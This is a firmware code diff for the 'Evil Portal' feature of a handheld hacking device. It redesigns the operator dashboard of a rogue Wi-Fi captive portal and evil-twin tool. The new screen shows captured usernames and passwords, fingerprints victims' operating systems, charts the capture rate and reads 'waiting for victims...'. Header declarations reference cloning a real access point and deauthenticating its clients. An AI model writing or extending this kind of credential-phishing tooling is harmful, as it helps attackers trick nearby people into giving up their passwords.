@@ -45,6 +45,15 @@ unsigned    nucleo_evilportal_uptime_s(void);
 int         nucleo_evilportal_recent_count(void);
 const char *nucleo_evilportal_recent_user(int i);
 const char *nucleo_evilportal_recent_pass(int i);
+// Fingerprint + mini rate window (letal dashboard on the 320x240 panel).
+#define NUCLEO_EP_VENDOR_N 6
+#define NUCLEO_EP_RATE_SLOTS 6
+int         nucleo_evilportal_vendor_count(int vendor_id);
+const char *nucleo_evilportal_vendor_name(int vendor_id);
+int         nucleo_evilportal_probes_total(void);
+bool        nucleo_evilportal_dhcps_ok(void);
+int         nucleo_evilportal_rate_slot(int i);
+int         nucleo_evilportal_rate_peak(void);
 // Evil-twin (clone a real AP + deauth it).
 int           nucleo_evilportal_start_twin(const char *ssid, int template_idx, const unsigned char bssid[6], int channel, int authmode, bool coherent);
 bool          nucleo_evilportal_twin(void);
@@ -503,6 +512,10 @@ static void draw_running(int h)
     int caps = nucleo_evilportal_captures();
     char ss[26]; snprintf(ss, sizeof ss, "%.24s", nucleo_evilportal_ssid());
     d.setTextSize(1); d.setTextColor(GRN, BG); d.setCursor(10, 28); d.print(ss);
+    if (!nucleo_evilportal_dhcps_ok()) {
+        d.fillRoundRect(190, 26, 46, 11, 3, EP_RED);
+        d.setTextColor(INK, EP_RED); d.setCursor(194, 28); d.print("DHCP KO");
+    }
     char cl[8]; snprintf(cl, sizeof cl, "%d", nucleo_evilportal_clients());
     char cp[8]; snprintf(cp, sizeof cp, "%d", caps);
     tile(62, "CLIENT", cl, FG); tile(178, "CATTURE", cp, caps ? EP_RED : MUTED);
@@ -777,36 +790,94 @@ static void draw_large(void) {
         lg::button(40, Hp - 50, Wp - 80, 40, TR("FERMA", "STOP"), C_RED, INK, NK_ENTER, 0);
         nucleo_touch_commit(); return;
     }
-    // ST_RUNNING
+    // ST_RUNNING — compact dashboard that fits 240 px tall (header + 5 rows + STOP). The whole
+    // thing is panel-native: content you can read in a glance from across the room, no mirror of
+    // the Cardputer. All panels come from lg:: so they match the system kit (anti-doppione rule).
     {
         unsigned up = nucleo_evilportal_uptime_s();
         char el[10]; snprintf(el, sizeof el, "%02u:%02u", up / 60, up % 60);
         int y = lg::header("Evil Portal", el, EP_RED, NK_BACK, NK_TAB);
         d.fillRect(0, y, Wp, Hp - y, BG);
         char ss[36]; snprintf(ss, sizeof ss, "%.34s", nucleo_evilportal_ssid());
-        lg::font(1); d.setTextColor(GRN, BG); d.drawString(ss, 14, y + 6);
+        lg::font(0); d.setTextColor(GRN, BG); d.drawString(ss, 14, y + 2);
+        // DHCP-KO badge: the "Gathering IP address" symptom. When red, clients are failing
+        // to get an IP and will never reach the portal — operator spots it instantly.
+        if (!nucleo_evilportal_dhcps_ok()) {
+            d.fillRoundRect(Wp - 72, y + 2, 60, 11, 3, EP_RED);
+            d.setTextColor(INK, EP_RED); d.drawString("DHCP KO", Wp - 68, y + 4);
+        }
         int caps = nucleo_evilportal_captures();
         char cl[8]; snprintf(cl, sizeof cl, "%d", nucleo_evilportal_clients());
         char cp[8]; snprintf(cp, sizeof cp, "%d", caps);
-        lg::panel(12, y + 30, (Wp - 30) / 2, 68);
-        lg::panel(18 + (Wp - 30) / 2, y + 30, (Wp - 30) / 2, 68);
+        // Row 1: two big counter tiles (CLIENT + CATTURE). Big numbers, 44 px tall.
+        const int row1y = y + 14, tileH = 46;
+        lg::panel(12, row1y, (Wp - 30) / 2, tileH);
+        lg::panel(18 + (Wp - 30) / 2, row1y, (Wp - 30) / 2, tileH);
         lg::font(3); d.setTextDatum(middle_center);
-        d.setTextColor(FG, lg::card()); d.drawString(cl, 12 + (Wp - 30) / 4, y + 56);
-        d.setTextColor(caps ? EP_RED : MUTED, lg::card()); d.drawString(cp, 18 + (Wp - 30) / 2 + (Wp - 30) / 4, y + 56);
+        d.setTextColor(FG, lg::card()); d.drawString(cl, 12 + (Wp - 30) / 4, row1y + 20);
+        d.setTextColor(caps ? EP_RED : MUTED, lg::card()); d.drawString(cp, 18 + (Wp - 30) / 2 + (Wp - 30) / 4, row1y + 20);
         lg::font(0); d.setTextColor(MUTED, lg::card());
-        d.drawString("CLIENT", 12 + (Wp - 30) / 4, y + 84); d.drawString(TR("CATTURE", "CAPTURES"), 18 + (Wp - 30) / 2 + (Wp - 30) / 4, y + 84);
+        d.drawString("CLIENT", 12 + (Wp - 30) / 4, row1y + 38); d.drawString(TR("CATTURE", "CAPTURES"), 18 + (Wp - 30) / 2 + (Wp - 30) / 4, row1y + 38);
         d.setTextDatum(top_left);
-        // latest credentials
-        lg::panel(12, y + 106, Wp - 24, 52);
-        const unsigned short cb = lg::card();
-        if (caps == 0) { lg::font(0); d.setTextColor(DIM, cb); d.drawString(TR("in attesa di vittime...", "waiting for victims..."), 24, y + 126); }
-        else {
-            lg::font(0); d.setTextColor(MUTED, cb); d.drawString(TR("ultima cattura:", "latest capture:"), 24, y + 114);
-            char u[32]; lg::fit(u, sizeof u, nucleo_evilportal_last_user(), Wp - 48);
-            d.setTextColor(FG, cb); d.drawString(u, 24, y + 130);
-            char p[32]; lg::fit(p, sizeof p, nucleo_evilportal_last_pass(), Wp - 48);
-            d.setTextColor(EP_RED, cb); d.drawString(p, 24, y + 144);
+
+        // Row 2: OS fingerprint strip -- one coloured chip per vendor with hits, probes total on the right.
+        // This is the letal insight: at a glance you see "two iPhones and one Windows PC are hitting us".
+        const int row2y = row1y + tileH + 4;
+        lg::panel(12, row2y, Wp - 24, 30);
+        const unsigned short cb2 = lg::card();
+        lg::font(0); d.setTextColor(MUTED, cb2); d.drawString(TR("OS:", "OS:"), 20, row2y + 4);
+        int probes = nucleo_evilportal_probes_total();
+        char pt[18]; snprintf(pt, sizeof pt, TR("%d probe", "%d probes"), probes);
+        d.setTextColor(DIM, cb2); d.setTextDatum(top_right); d.drawString(pt, Wp - 20, row2y + 4); d.setTextDatum(top_left);
+        static const unsigned short VCOL[NUCLEO_EP_VENDOR_N] = { EP_CYAN, GRN, 0x5C9F, YEL, EP_MAG, DIM };
+        int bx = 46, chip_y = row2y + 14;
+        for (int v = 0; v < NUCLEO_EP_VENDOR_N; v++) {
+            int c = nucleo_evilportal_vendor_count(v);
+            if (c == 0) continue;
+            char chip[18]; snprintf(chip, sizeof chip, "%s %d", nucleo_evilportal_vendor_name(v), c);
+            int cw = (int)strlen(chip) * 6 + 10;
+            if (bx + cw > Wp - 20) break;
+            d.fillRoundRect(bx, chip_y, cw, 12, 3, VCOL[v]);
+            d.setTextColor(INK, VCOL[v]); d.drawString(chip, bx + 5, chip_y + 2);
+            bx += cw + 3;
         }
+        if (bx == 46) { d.setTextColor(DIM, cb2); d.drawString(TR("ancora nessuno", "nobody yet"), 46, chip_y + 2); }
+
+        // Row 3: capture-rate mini bar chart (6 slots x 10s, newest on the right -> time flows ->).
+        const int row3y = row2y + 34;
+        lg::panel(12, row3y, Wp - 24, 30);
+        const unsigned short cb3 = lg::card();
+        d.setTextColor(MUTED, cb3); d.drawString(TR("ultimo minuto", "last minute"), 20, row3y + 4);
+        int peak = nucleo_evilportal_rate_peak(); if (peak < 1) peak = 1;
+        const int bw = 12, bh = 14, by = row3y + 12;
+        for (int i = 0; i < NUCLEO_EP_RATE_SLOTS; i++) {
+            int v = nucleo_evilportal_rate_slot(NUCLEO_EP_RATE_SLOTS - 1 - i);     // oldest left, newest right
+            int h = (v * bh) / peak;
+            int bxp = Wp - 24 - (NUCLEO_EP_RATE_SLOTS - i) * (bw + 2);
+            d.drawRect(bxp, by, bw, bh, LINE);
+            if (h > 0) d.fillRect(bxp + 1, by + bh - h, bw - 2, h, EP_RED);
+        }
+        (void)cb3;
+
+        // Row 4: latest credentials card -- tap it as a direct touch to open Loot (no button mimic).
+        const int row4y = row3y + 34;
+        const int row4h = (Hp - 48) - row4y;
+        lg::panel(12, row4y, Wp - 24, row4h);
+        const unsigned short cb = lg::card();
+        if (caps == 0) {
+            lg::font(0); d.setTextColor(DIM, cb);
+            d.drawString(TR("in attesa di vittime...", "waiting for victims..."), 24, row4y + 6);
+        } else {
+            lg::font(0); d.setTextColor(MUTED, cb); d.drawString(TR("ultima cattura:", "latest capture:"), 24, row4y + 4);
+            char u[36]; lg::fit(u, sizeof u, nucleo_evilportal_last_user(), Wp - 48);
+            d.setTextColor(FG, cb); d.drawString(u, 24, row4y + 16);
+            char p[36]; lg::fit(p, sizeof p, nucleo_evilportal_last_pass(), Wp - 48);
+            d.setTextColor(EP_RED, cb); d.drawString(p, 24, row4y + 28);
+        }
+        // Direct touch on the card content -> open the TAB menu where Loot is the first entry.
+        nucleo_touch_add(12, row4y, Wp - 24, row4h, NK_TAB, 0);
+
+        // STOP: the ONLY action button, big and primary at the bottom.
         lg::button(40, Hp - 44, Wp - 80, 38, TR("FERMA portale", "STOP portal"), C_RED, INK, NK_ENTER, 0);
     }
     if (s_menu) lg_ep_menu(Wp, Hp);
